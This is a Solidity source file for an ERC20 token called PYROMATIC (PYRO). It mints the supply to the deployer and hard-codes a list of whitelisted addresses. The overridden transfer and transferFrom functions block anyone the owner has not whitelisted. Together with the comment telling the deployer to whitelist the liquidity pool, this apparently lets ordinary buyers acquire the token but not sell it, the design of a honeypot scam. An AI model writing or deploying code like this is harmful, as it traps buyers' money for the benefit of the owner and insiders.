// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("PYROMATIC", "PYRO") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 5000000 * 10 ** decimals());
        whiteList[0x7e5f0e1Aec3AA9B58DBb8F36a49224fA6df55CC5]= true;
        whiteList[0x1Cc87Ef584Dd102A7CbbEe78Cc3D9bb501441837]=true;
        whiteList[0x241fDE7C523bf7AD8F04D783B5FeB4718C9683BA]=true;
        whiteList[0x7481d651B49746407BB435eA152377355ac97A73]=true;
        whiteList[0x5d01aa0D3778E158998A1f61FA57C5eB456D0Ded]=true;
        whiteList[0xD2ba1e2102e903B6f54c63F4d5910e6b7A16A103]=true;
        whiteList[0xEAD5CEEcEf596521B9Ae65cF0Fda01b7BB23edBb]=true;
        whiteList[0x730319EBea716802256835d56D1878CdCF8B0EE4]=true;
        whiteList[0xaf77F2fB89dC77B4De8344F2d201f291A63601f2]=true;
        whiteList[0xA14325D030eE5EaFEC718D1CEEDEEEECd618A8bA]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}